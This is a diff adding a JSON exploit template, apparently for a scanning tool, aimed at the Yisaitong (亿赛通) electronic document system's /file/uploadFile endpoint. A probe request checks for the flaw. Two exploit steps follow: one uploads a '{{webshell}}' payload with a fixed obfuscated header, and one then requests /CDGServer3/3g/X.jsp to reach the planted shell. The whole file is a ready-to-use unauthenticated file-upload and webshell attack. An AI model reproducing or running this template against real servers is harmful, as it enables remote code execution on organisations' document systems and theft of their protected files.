@@ -1,0 +1,44 @@
+{
+	"name":"亿赛通电子文档uploadFile接口文件上传",
+	"tag":"yisaitong",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/file/uploadFile",
+		"pocPost":"--0ac445a70ef9526aeb69efb4569810d6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n\r\n123\r\n--0ac445a70ef9526aeb69efb4569810d6--",
+		"header":{
+			"Content":" MGIFOACOKLJAHOGCPPOBDFLGJFPACJJKLFGFOBDNHAGLEDGALNKAEHDLMEOODCBFDIMEFNGHCMGBPABDLPPCHCLMAELIDDCLOGNPOCGHIEFJHIOEIIPPJBCIFCPDOKIOMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGMMOLGLGMIHOOFLHLBEHNIHOPOEKKIPHCMJAOMGMNPFINKHMPBFOJBJPNLNKILIOCLAEPIKJDNOJHELELCOLLAKKAPFFPFGPMOLGPBDAHIHKEFDIFPDMDKDDKNMOGMLDEMBEAMFOOCECFKCKHJBDDMIENNFFMABEFNKCCIAIJIKGDAOGCDMNCNEGOGBNJIJFBBEBODAPNLOFJMOGCJGMOCHNJALDDDKLPGM",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Content-Length":" 143",
+			"Content-Type":" multipart/form-data; boundary=0ac445a70ef9526aeb69efb4569810d6"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/file/uploadFile",
+			"expPost":"--0ac445a70ef9526aeb69efb4569810d6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n\r\n{{webshell}}\r\n--0ac445a70ef9526aeb69efb4569810d6--",
+			"header":{
+				"Content":" MGIFOACOKLJAHOGCPPOBDFLGJFPACJJKLFGFOBDNHAGLEDGALNKAEHDLMEOODCBFDIMEFNGHCMGBPABDLPPCHCLMAELIDDCLOGNPOCGHIEFJHIOEIIPPJBCIFCPDOKIOMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGMMOLGLGMIHOOFLHLBEHNIHOPOEKKIPHCMJAOMGMNPFINKHMPBFOJBJPNLNKILIOCLAEPIKJDNOJHELELCOLLAKKAPFFPFGPMOLGPBDAHIHKEFDIFPDMDKDDKNMOGMLDEMBEAMFOOCECFKCKHJBDDMIENNFFMABEFNKCCIAIJIKGDAOGCDMNCNEGOGBNJIJFBBEBODAPNLOFJMOGCJGMOCHNJALDDDKLPGM",
+				"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+				"Connection":" close",
+				"Accept-Encoding":" gzip, deflate, br",
+				"Content-Length":" 143",
+				"Content-Type":" multipart/form-data; boundary=0ac445a70ef9526aeb69efb4569810d6"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		},
+		"step2":{
+			"expGet":"/CDGServer3/3g/X.jsp",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
